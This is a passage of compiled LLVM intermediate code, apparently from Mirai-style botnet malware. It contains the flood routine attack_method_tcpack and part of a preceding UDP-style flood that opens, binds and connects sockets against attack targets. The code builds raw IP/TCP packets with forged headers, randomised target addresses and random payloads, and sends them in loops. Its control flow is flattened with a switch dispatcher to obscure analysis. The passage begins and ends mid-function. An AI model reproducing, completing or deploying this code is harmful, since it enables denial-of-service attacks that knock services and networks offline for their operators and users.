  store i16 %77, i16* %83, align 2
  store i32 1564388665, i32* %switchVar
  br label %loopEnd

; <label>:84:                                     ; preds = %loopEntry
  %85 = load i16, i16* %12, align 2
  %86 = call zeroext i16 @htons(i16 zeroext %85) #8
  %87 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %88 = load i32, i32* %9, align 4
  %89 = sext i32 %88 to i64
  %90 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %87, i64 %89
  %91 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %90, i32 0, i32 0
  %92 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %91, i32 0, i32 1
  store i16 %86, i16* %92, align 2
  store i32 1564388665, i32* %switchVar
  br label %loopEnd

; <label>:93:                                     ; preds = %loopEntry
  %94 = call i32 @socket(i32 2, i32 2, i32 0) #7
  %95 = load i32*, i32** %11, align 8
  %96 = load i32, i32* %9, align 4
  %97 = sext i32 %96 to i64
  %98 = getelementptr inbounds i32, i32* %95, i64 %97
  store i32 %94, i32* %98, align 4
  %99 = icmp eq i32 %94, -1
  %100 = select i1 %99, i32 451993870, i32 -115844216
  store i32 %100, i32* %switchVar
  br label %loopEnd

; <label>:101:                                    ; preds = %loopEntry
  ret void

; <label>:102:                                    ; preds = %loopEntry
  %103 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 0
  store i16 2, i16* %103, align 4
  %104 = load i16, i16* %13, align 2
  %105 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %104, i16* %105, align 2
  %106 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %107 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %106, i32 0, i32 0
  store i32 0, i32* %107, align 4
  %108 = load i32*, i32** %11, align 8
  %109 = load i32, i32* %9, align 4
  %110 = sext i32 %109 to i64
  %111 = getelementptr inbounds i32, i32* %108, i64 %110
  %112 = load i32, i32* %111, align 4
  %113 = bitcast %union.__CONST_SOCKADDR_ARG* %20 to %struct.sockaddr**
  %114 = bitcast %struct.sockaddr_in* %16 to %struct.sockaddr*
  store %struct.sockaddr* %114, %struct.sockaddr** %113, align 8
  %115 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %20, i32 0, i32 0
  %116 = load %struct.sockaddr*, %struct.sockaddr** %115, align 8
  %117 = call i32 @bind(i32 %112, %struct.sockaddr* %116, i32 16) #7
  %118 = icmp eq i32 %117, -1
  %119 = select i1 %118, i32 -960831587, i32 -1395659304
  store i32 %119, i32* %switchVar
  br label %loopEnd

; <label>:120:                                    ; preds = %loopEntry
  store i32 -1395659304, i32* %switchVar
  br label %loopEnd

; <label>:121:                                    ; preds = %loopEntry
  %122 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %123 = load i32, i32* %9, align 4
  %124 = sext i32 %123 to i64
  %125 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %122, i64 %124
  %126 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %125, i32 0, i32 2
  %127 = load i8, i8* %126, align 4
  %128 = zext i8 %127 to i32
  %129 = icmp slt i32 %128, 32
  %130 = select i1 %129, i32 -637309357, i32 -424036325
  store i32 %130, i32* %switchVar
  br label %loopEnd

; <label>:131:                                    ; preds = %loopEntry
  %132 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %133 = load i32, i32* %9, align 4
  %134 = sext i32 %133 to i64
  %135 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %132, i64 %134
  %136 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %135, i32 0, i32 1
  %137 = load i32, i32* %136, align 4
  %138 = call i32 @ntohl(i32 %137) #8
  %139 = call i32 @rand_next()
  %140 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %141 = load i32, i32* %9, align 4
  %142 = sext i32 %141 to i64
  %143 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %140, i64 %142
  %144 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %143, i32 0, i32 2
  %145 = load i8, i8* %144, align 4
  %146 = zext i8 %145 to i32
  %147 = lshr i32 %139, %146
  %148 = add i32 %138, %147
  %149 = call i32 @htonl(i32 %148) #8
  %150 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %151 = load i32, i32* %9, align 4
  %152 = sext i32 %151 to i64
  %153 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %150, i64 %152
  %154 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %153, i32 0, i32 0
  %155 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %154, i32 0, i32 2
  %156 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %155, i32 0, i32 0
  store i32 %149, i32* %156, align 4
  store i32 -424036325, i32* %switchVar
  br label %loopEnd

; <label>:157:                                    ; preds = %loopEntry
  %158 = load i32*, i32** %11, align 8
  %159 = load i32, i32* %9, align 4
  %160 = sext i32 %159 to i64
  %161 = getelementptr inbounds i32, i32* %158, i64 %160
  %162 = load i32, i32* %161, align 4
  %163 = bitcast %union.__CONST_SOCKADDR_ARG* %21 to %struct.sockaddr**
  %164 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %165 = load i32, i32* %9, align 4
  %166 = sext i32 %165 to i64
  %167 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %164, i64 %166
  %168 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %167, i32 0, i32 0
  %169 = bitcast %struct.sockaddr_in* %168 to %struct.sockaddr*
  store %struct.sockaddr* %169, %struct.sockaddr** %163, align 8
  %170 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %21, i32 0, i32 0
  %171 = load %struct.sockaddr*, %struct.sockaddr** %170, align 8
  %172 = call i32 @connect(i32 %162, %struct.sockaddr* %171, i32 16)
  %173 = icmp eq i32 %172, -1
  %174 = select i1 %173, i32 1215309582, i32 1076689718
  store i32 %174, i32* %switchVar
  br label %loopEnd

; <label>:175:                                    ; preds = %loopEntry
  store i32 1076689718, i32* %switchVar
  br label %loopEnd

; <label>:176:                                    ; preds = %loopEntry
  store i32 -1625333119, i32* %switchVar
  br label %loopEnd

; <label>:177:                                    ; preds = %loopEntry
  %178 = load i32, i32* %9, align 4
  %179 = add nsw i32 %178, 1
  store i32 %179, i32* %9, align 4
  store i32 -849144575, i32* %switchVar
  br label %loopEnd

; <label>:180:                                    ; preds = %loopEntry
  store i32 943416590, i32* %switchVar
  br label %loopEnd

; <label>:181:                                    ; preds = %loopEntry
  store i32 0, i32* %9, align 4
  store i32 1291921024, i32* %switchVar
  br label %loopEnd

; <label>:182:                                    ; preds = %loopEntry
  %183 = load i32, i32* %9, align 4
  %184 = load i8, i8* %5, align 1
  %185 = zext i8 %184 to i32
  %186 = icmp slt i32 %183, %185
  %187 = select i1 %186, i32 -1828000714, i32 -1650053731
  store i32 %187, i32* %switchVar
  br label %loopEnd

; <label>:188:                                    ; preds = %loopEntry
  %189 = load i8**, i8*** %10, align 8
  %190 = load i32, i32* %9, align 4
  %191 = sext i32 %190 to i64
  %192 = getelementptr inbounds i8*, i8** %189, i64 %191
  %193 = load i8*, i8** %192, align 8
  store i8* %193, i8** %22, align 8
  %194 = load i8, i8* %15, align 1
  %195 = icmp ne i8 %194, 0
  %196 = select i1 %195, i32 1786381290, i32 -937069212
  store i32 %196, i32* %switchVar
  br label %loopEnd

; <label>:197:                                    ; preds = %loopEntry
  %198 = load i8*, i8** %22, align 8
  %199 = load i16, i16* %14, align 2
  %200 = zext i16 %199 to i32
  call void @rand_str(i8* %198, i32 %200)
  store i32 -937069212, i32* %switchVar
  br label %loopEnd

; <label>:201:                                    ; preds = %loopEntry
  %202 = load i32*, i32** %11, align 8
  %203 = load i32, i32* %9, align 4
  %204 = sext i32 %203 to i64
  %205 = getelementptr inbounds i32, i32* %202, i64 %204
  %206 = load i32, i32* %205, align 4
  %207 = load i8*, i8** %22, align 8
  %208 = load i16, i16* %14, align 2
  %209 = zext i16 %208 to i64
  %210 = call i64 @send(i32 %206, i8* %207, i64 %209, i32 16384)
  store i32 1669347542, i32* %switchVar
  br label %loopEnd

; <label>:211:                                    ; preds = %loopEntry
  %212 = load i32, i32* %9, align 4
  %213 = add nsw i32 %212, 1
  store i32 %213, i32* %9, align 4
  store i32 1291921024, i32* %switchVar
  br label %loopEnd

; <label>:214:                                    ; preds = %loopEntry
  store i32 943416590, i32* %switchVar
  br label %loopEnd

loopEnd:                                          ; preds = %214, %211, %201, %197, %188, %182, %181, %180, %177, %176, %175, %157, %131, %121, %120, %102, %93, %84, %75, %65, %59, %58, %55, %52, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define void @attack_method_tcpack(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %.reg2mem = alloca i32
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i8, align 1
  %13 = alloca i16, align 2
  %14 = alloca i8, align 1
  %15 = alloca i8, align 1
  %16 = alloca i16, align 2
  %17 = alloca i16, align 2
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8, align 1
  %21 = alloca i8, align 1
  %22 = alloca i8, align 1
  %23 = alloca i8, align 1
  %24 = alloca i8, align 1
  %25 = alloca i8, align 1
  %26 = alloca i32, align 4
  %27 = alloca i8, align 1
  %28 = alloca i32, align 4
  %29 = alloca %struct.iphdr*, align 8
  %30 = alloca %struct.tcphdr*, align 8
  %31 = alloca i8*, align 8
  %32 = alloca i8*, align 8
  %33 = alloca %struct.iphdr*, align 8
  %34 = alloca %struct.tcphdr*, align 8
  %35 = alloca i8*, align 8
  %36 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %37 = load i8, i8* %5, align 1
  %38 = zext i8 %37 to i64
  %39 = call noalias i8* @calloc(i64 %38, i64 8) #7
  %40 = bitcast i8* %39 to i8**
  store i8** %40, i8*** %11, align 8
  %41 = load i8, i8* %7, align 1
  %42 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %43 = call i32 @attack_get_opt_int(i8 zeroext %41, %struct.attack_option* %42, i8 zeroext 2, i32 0)
  %44 = trunc i32 %43 to i8
  store i8 %44, i8* %12, align 1
  %45 = load i8, i8* %7, align 1
  %46 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %47 = call i32 @attack_get_opt_int(i8 zeroext %45, %struct.attack_option* %46, i8 zeroext 3, i32 65535)
  %48 = trunc i32 %47 to i16
  store i16 %48, i16* %13, align 2
  %49 = load i8, i8* %7, align 1
  %50 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %51 = call i32 @attack_get_opt_int(i8 zeroext %49, %struct.attack_option* %50, i8 zeroext 4, i32 64)
  %52 = trunc i32 %51 to i8
  store i8 %52, i8* %14, align 1
  %53 = load i8, i8* %7, align 1
  %54 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %55 = call i32 @attack_get_opt_int(i8 zeroext %53, %struct.attack_option* %54, i8 zeroext 5, i32 0)
  %56 = trunc i32 %55 to i8
  store i8 %56, i8* %15, align 1
  %57 = load i8, i8* %7, align 1
  %58 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %59 = call i32 @attack_get_opt_int(i8 zeroext %57, %struct.attack_option* %58, i8 zeroext 6, i32 65535)
  %60 = trunc i32 %59 to i16
  store i16 %60, i16* %16, align 2
  %61 = load i8, i8* %7, align 1
  %62 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %63 = call i32 @attack_get_opt_int(i8 zeroext %61, %struct.attack_option* %62, i8 zeroext 7, i32 65535)
  %64 = trunc i32 %63 to i16
  store i16 %64, i16* %17, align 2
  %65 = load i8, i8* %7, align 1
  %66 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %67 = call i32 @attack_get_opt_int(i8 zeroext %65, %struct.attack_option* %66, i8 zeroext 17, i32 65535)
  store i32 %67, i32* %18, align 4
  %68 = load i8, i8* %7, align 1
  %69 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %70 = call i32 @attack_get_opt_int(i8 zeroext %68, %struct.attack_option* %69, i8 zeroext 18, i32 65535)
  store i32 %70, i32* %19, align 4
  %71 = load i8, i8* %7, align 1
  %72 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %73 = call i32 @attack_get_opt_int(i8 zeroext %71, %struct.attack_option* %72, i8 zeroext 11, i32 0)
  %74 = trunc i32 %73 to i8
  store i8 %74, i8* %20, align 1
  %75 = load i8, i8* %7, align 1
  %76 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %77 = call i32 @attack_get_opt_int(i8 zeroext %75, %struct.attack_option* %76, i8 zeroext 12, i32 1)
  %78 = trunc i32 %77 to i8
  store i8 %78, i8* %21, align 1
  %79 = load i8, i8* %7, align 1
  %80 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %81 = call i32 @attack_get_opt_int(i8 zeroext %79, %struct.attack_option* %80, i8 zeroext 13, i32 0)
  %82 = trunc i32 %81 to i8
  store i8 %82, i8* %22, align 1
  %83 = load i8, i8* %7, align 1
  %84 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %85 = call i32 @attack_get_opt_int(i8 zeroext %83, %struct.attack_option* %84, i8 zeroext 14, i32 0)
  %86 = trunc i32 %85 to i8
  store i8 %86, i8* %23, align 1
  %87 = load i8, i8* %7, align 1
  %88 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %89 = call i32 @attack_get_opt_int(i8 zeroext %87, %struct.attack_option* %88, i8 zeroext 15, i32 0)
  %90 = trunc i32 %89 to i8
  store i8 %90, i8* %24, align 1
  %91 = load i8, i8* %7, align 1
  %92 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %93 = call i32 @attack_get_opt_int(i8 zeroext %91, %struct.attack_option* %92, i8 zeroext 16, i32 0)
  %94 = trunc i32 %93 to i8
  store i8 %94, i8* %25, align 1
  %95 = load i8, i8* %7, align 1
  %96 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %97 = call i32 @attack_get_opt_int(i8 zeroext %95, %struct.attack_option* %96, i8 zeroext 0, i32 512)
  store i32 %97, i32* %26, align 4
  %98 = load i8, i8* %7, align 1
  %99 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %100 = call i32 @attack_get_opt_int(i8 zeroext %98, %struct.attack_option* %99, i8 zeroext 1, i32 1)
  %101 = trunc i32 %100 to i8
  store i8 %101, i8* %27, align 1
  %102 = load i8, i8* %7, align 1
  %103 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %104 = load i32, i32* @LOCAL_ADDR, align 4
  %105 = call i32 @attack_get_opt_ip(i8 zeroext %102, %struct.attack_option* %103, i8 zeroext 25, i32 %104)
  store i32 %105, i32* %28, align 4
  %106 = call i32 @socket(i32 2, i32 3, i32 6) #7
  store i32 %106, i32* %.reg2mem
  %.reload2 = load volatile i32, i32* %.reg2mem
  store i32 %.reload2, i32* %10, align 4
  %switchVar = alloca i32
  store i32 -553562293, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %4
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -553562293, label %first
    i32 -1972689695, label %109
    i32 1087907360, label %110
    i32 726918506, label %116
    i32 -1927251869, label %119
    i32 1729517977, label %120
    i32 -685487727, label %126
    i32 395945706, label %174
    i32 1301670335, label %178
    i32 320084074, label %273
    i32 1972620613, label %279
    i32 -1123735117, label %282
    i32 1996856200, label %285
    i32 -1904391255, label %286
    i32 -1460452432, label %287
    i32 2008729559, label %293
    i32 -815960277, label %316
    i32 -1121110933, label %337
    i32 963719093, label %341
    i32 1888885508, label %345
    i32 -322665144, label %350
    i32 -1949605799, label %356
    i32 1345129081, label %361
    i32 1013730229, label %367
    i32 1113628145, label %372
    i32 881633951, label %378
    i32 259760430, label %382
    i32 -302726878, label %386
    i32 -1629342123, label %390
    i32 1216247717, label %394
    i32 -1144596470, label %398
    i32 1553793169, label %401
    i32 21448375, label %450
    i32 -72759094, label %453
    i32 255687759, label %454
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %107 = icmp eq i32 %.reload, -1
  %108 = select i1 %107, i32 -1972689695, i32 1087907360
  store i32 %108, i32* %switchVar
  br label %loopEnd

; <label>:109:                                    ; preds = %loopEntry
  store i32 255687759, i32* %switchVar
  br label %loopEnd

; <label>:110:                                    ; preds = %loopEntry
  store i32 1, i32* %9, align 4
  %111 = load i32, i32* %10, align 4
  %112 = bitcast i32* %9 to i8*
  %113 = call i32 @setsockopt(i32 %111, i32 0, i32 3, i8* %112, i32 4) #7
  %114 = icmp eq i32 %113, -1
  %115 = select i1 %114, i32 726918506, i32 -1927251869
  store i32 %115, i32* %switchVar
  br label %loopEnd

; <label>:116:                                    ; preds = %loopEntry
  %117 = load i32, i32* %10, align 4
  %118 = call i32 @close(i32 %117)
  store i32 255687759, i32* %switchVar
  br label %loopEnd

; <label>:119:                                    ; preds = %loopEntry
  store i32 0, i32* %9, align 4
  store i32 1729517977, i32* %switchVar
  br label %loopEnd

; <label>:120:                                    ; preds = %loopEntry
  %121 = load i32, i32* %9, align 4
  %122 = load i8, i8* %5, align 1
  %123 = zext i8 %122 to i32
  %124 = icmp slt i32 %121, %123
  %125 = select i1 %124, i32 -685487727, i32 1996856200
  store i32 %125, i32* %switchVar
  br label %loopEnd

; <label>:126:                                    ; preds = %loopEntry
  %127 = call noalias i8* @calloc(i64 1510, i64 1) #7
  %128 = load i8**, i8*** %11, align 8
  %129 = load i32, i32* %9, align 4
  %130 = sext i32 %129 to i64
  %131 = getelementptr inbounds i8*, i8** %128, i64 %130
  store i8* %127, i8** %131, align 8
  %132 = load i8**, i8*** %11, align 8
  %133 = load i32, i32* %9, align 4
  %134 = sext i32 %133 to i64
  %135 = getelementptr inbounds i8*, i8** %132, i64 %134
  %136 = load i8*, i8** %135, align 8
  %137 = bitcast i8* %136 to %struct.iphdr*
  store %struct.iphdr* %137, %struct.iphdr** %29, align 8
  %138 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %139 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %138, i64 1
  %140 = bitcast %struct.iphdr* %139 to %struct.tcphdr*
  store %struct.tcphdr* %140, %struct.tcphdr** %30, align 8
  %141 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %142 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %141, i64 1
  %143 = bitcast %struct.tcphdr* %142 to i8*
  store i8* %143, i8** %31, align 8
  %144 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %145 = bitcast %struct.iphdr* %144 to i8*
  %146 = load i8, i8* %145, align 4
  %147 = and i8 %146, 15
  %148 = or i8 %147, 64
  store i8 %148, i8* %145, align 4
  %149 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %150 = bitcast %struct.iphdr* %149 to i8*
  %151 = load i8, i8* %150, align 4
  %152 = and i8 %151, -16
  %153 = or i8 %152, 5
  store i8 %153, i8* %150, align 4
  %154 = load i8, i8* %12, align 1
  %155 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %156 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %155, i32 0, i32 1
  store i8 %154, i8* %156, align 1
  %157 = load i32, i32* %26, align 4
  %158 = sext i32 %157 to i64
  %159 = add i64 40, %158
  %160 = trunc i64 %159 to i16
  %161 = call zeroext i16 @htons(i16 zeroext %160) #8
  %162 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %163 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %162, i32 0, i32 2
  store i16 %161, i16* %163, align 2
  %164 = load i16, i16* %13, align 2
  %165 = call zeroext i16 @htons(i16 zeroext %164) #8
  %166 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %167 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %166, i32 0, i32 3
  store i16 %165, i16* %167, align 4
  %168 = load i8, i8* %14, align 1
  %169 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %170 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %169, i32 0, i32 5
  store i8 %168, i8* %170, align 4
  %171 = load i8, i8* %15, align 1
  %172 = icmp ne i8 %171, 0
  %173 = select i1 %172, i32 395945706, i32 1301670335
  store i32 %173, i32* %switchVar
  br label %loopEnd

; <label>:174:                                    ; preds = %loopEntry
  %175 = call zeroext i16 @htons(i16 zeroext 16384) #8
  %176 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %177 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %176, i32 0, i32 4
  store i16 %175, i16* %177, align 2
  store i32 1301670335, i32* %switchVar
  br label %loopEnd

; <label>:178:                                    ; preds = %loopEntry
  %179 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %180 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %179, i32 0, i32 6
  store i8 6, i8* %180, align 1
  %181 = load i32, i32* %28, align 4
  %182 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %183 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %182, i32 0, i32 8
  store i32 %181, i32* %183, align 4
  %184 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %185 = load i32, i32* %9, align 4
  %186 = sext i32 %185 to i64
  %187 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %184, i64 %186
  %188 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %187, i32 0, i32 1
  %189 = load i32, i32* %188, align 4
  %190 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %191 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %190, i32 0, i32 9
  store i32 %189, i32* %191, align 4
  %192 = load i16, i16* %16, align 2
  %193 = call zeroext i16 @htons(i16 zeroext %192) #8
  %194 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %195 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %194, i32 0, i32 0
  store i16 %193, i16* %195, align 4
  %196 = load i16, i16* %17, align 2
  %197 = call zeroext i16 @htons(i16 zeroext %196) #8
  %198 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %199 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %198, i32 0, i32 1
  store i16 %197, i16* %199, align 2
  %200 = load i32, i32* %18, align 4
  %201 = trunc i32 %200 to i16
  %202 = call zeroext i16 @htons(i16 zeroext %201) #8
  %203 = zext i16 %202 to i32
  %204 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %205 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %204, i32 0, i32 2
  store i32 %203, i32* %205, align 4
  %206 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %207 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %206, i32 0, i32 4
  %208 = load i16, i16* %207, align 4
  %209 = and i16 %208, -241
  %210 = or i16 %209, 80
  store i16 %210, i16* %207, align 4
  %211 = load i8, i8* %20, align 1
  %212 = sext i8 %211 to i16
  %213 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %214 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %213, i32 0, i32 4
  %215 = load i16, i16* %214, align 4
  %216 = and i16 %212, 1
  %217 = shl i16 %216, 13
  %218 = and i16 %215, -8193
  %219 = or i16 %218, %217
  store i16 %219, i16* %214, align 4
  %220 = load i8, i8* %21, align 1
  %221 = sext i8 %220 to i16
  %222 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %223 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %222, i32 0, i32 4
  %224 = load i16, i16* %223, align 4
  %225 = and i16 %221, 1
  %226 = shl i16 %225, 12
  %227 = and i16 %224, -4097
  %228 = or i16 %227, %226
  store i16 %228, i16* %223, align 4
  %229 = load i8, i8* %22, align 1
  %230 = sext i8 %229 to i16
  %231 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %232 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %231, i32 0, i32 4
  %233 = load i16, i16* %232, align 4
  %234 = and i16 %230, 1
  %235 = shl i16 %234, 11
  %236 = and i16 %233, -2049
  %237 = or i16 %236, %235
  store i16 %237, i16* %232, align 4
  %238 = load i8, i8* %23, align 1
  %239 = sext i8 %238 to i16
  %240 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %241 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %240, i32 0, i32 4
  %242 = load i16, i16* %241, align 4
  %243 = and i16 %239, 1
  %244 = shl i16 %243, 10
  %245 = and i16 %242, -1025
  %246 = or i16 %245, %244
  store i16 %246, i16* %241, align 4
  %247 = load i8, i8* %24, align 1
  %248 = sext i8 %247 to i16
  %249 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %250 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %249, i32 0, i32 4
  %251 = load i16, i16* %250, align 4
  %252 = and i16 %248, 1
  %253 = shl i16 %252, 9
  %254 = and i16 %251, -513
  %255 = or i16 %254, %253
  store i16 %255, i16* %250, align 4
  %256 = load i8, i8* %25, align 1
  %257 = sext i8 %256 to i16
  %258 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %259 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %258, i32 0, i32 4
  %260 = load i16, i16* %259, align 4
  %261 = and i16 %257, 1
  %262 = shl i16 %261, 8
  %263 = and i16 %260, -257
  %264 = or i16 %263, %262
  store i16 %264, i16* %259, align 4
  %265 = call i32 @rand_next()
  %266 = and i32 %265, 65535
  %267 = trunc i32 %266 to i16
  %268 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %269 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %268, i32 0, i32 5
  store i16 %267, i16* %269, align 2
  %270 = load i8, i8* %22, align 1
  %271 = icmp ne i8 %270, 0
  %272 = select i1 %271, i32 320084074, i32 1972620613
  store i32 %272, i32* %switchVar
  br label %loopEnd

; <label>:273:                                    ; preds = %loopEntry
  %274 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %275 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %274, i32 0, i32 4
  %276 = load i16, i16* %275, align 4
  %277 = and i16 %276, -2049
  %278 = or i16 %277, 2048
  store i16 %278, i16* %275, align 4
  store i32 1972620613, i32* %switchVar
  br label %loopEnd

; <label>:279:                                    ; preds = %loopEntry
  %280 = load i8*, i8** %31, align 8
  %281 = load i32, i32* %26, align 4
  call void @rand_str(i8* %280, i32 %281)
  store i32 -1123735117, i32* %switchVar
  br label %loopEnd

; <label>:282:                                    ; preds = %loopEntry
  %283 = load i32, i32* %9, align 4
  %284 = add nsw i32 %283, 1
  store i32 %284, i32* %9, align 4
  store i32 1729517977, i32* %switchVar
  br label %loopEnd

; <label>:285:                                    ; preds = %loopEntry
  store i32 -1904391255, i32* %switchVar
  br label %loopEnd

; <label>:286:                                    ; preds = %loopEntry
  store i32 0, i32* %9, align 4
  store i32 -1460452432, i32* %switchVar
  br label %loopEnd

; <label>:287:                                    ; preds = %loopEntry
  %288 = load i32, i32* %9, align 4
  %289 = load i8, i8* %5, align 1
  %290 = zext i8 %289 to i32
  %291 = icmp slt i32 %288, %290
  %292 = select i1 %291, i32 2008729559, i32 -72759094
  store i32 %292, i32* %switchVar
  br label %loopEnd

; <label>:293:                                    ; preds = %loopEntry
  %294 = load i8**, i8*** %11, align 8
  %295 = load i32, i32* %9, align 4
  %296 = sext i32 %295 to i64
  %297 = getelementptr inbounds i8*, i8** %294, i64 %296
  %298 = load i8*, i8** %297, align 8
  store i8* %298, i8** %32, align 8
  %299 = load i8*, i8** %32, align 8
  %300 = bitcast i8* %299 to %struct.iphdr*
  store %struct.iphdr* %300, %struct.iphdr** %33, align 8
  %301 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %302 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %301, i64 1
  %303 = bitcast %struct.iphdr* %302 to %struct.tcphdr*
  store %struct.tcphdr* %303, %struct.tcphdr** %34, align 8
  %304 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %305 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %304, i64 1
  %306 = bitcast %struct.tcphdr* %305 to i8*
  store i8* %306, i8** %35, align 8
  %307 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %308 = load i32, i32* %9, align 4
  %309 = sext i32 %308 to i64
  %310 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %307, i64 %309
  %311 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %310, i32 0, i32 2
  %312 = load i8, i8* %311, align 4
  %313 = zext i8 %312 to i32
  %314 = icmp slt i32 %313, 32
  %315 = select i1 %314, i32 -815960277, i32 -1121110933
  store i32 %315, i32* %switchVar
  br label %loopEnd

; <label>:316:                                    ; preds = %loopEntry
  %317 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %318 = load i32, i32* %9, align 4
  %319 = sext i32 %318 to i64
  %320 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %317, i64 %319
